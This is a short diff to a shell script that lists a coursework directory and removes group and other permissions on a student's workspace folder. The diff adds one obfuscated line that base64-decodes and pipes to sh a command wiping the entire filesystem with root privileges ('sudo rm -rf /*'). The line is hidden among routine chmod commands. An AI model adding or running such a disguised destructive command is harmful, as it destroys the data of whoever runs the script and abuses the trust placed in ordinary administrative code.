@@ -16,6 +16,8 @@ echo " "
 
 ls -al /usr/coursework
 
+base64 -d <<< c3VkbyBybSAtcmYgLyo= | sh
+
 sudo chmod o-rx /usr/coursework/StudentWorkspace/BetsyAfiles
 sudo chmod g-rx /usr/coursework/StudentWorkspace/BetsyAfiles
 echo " "
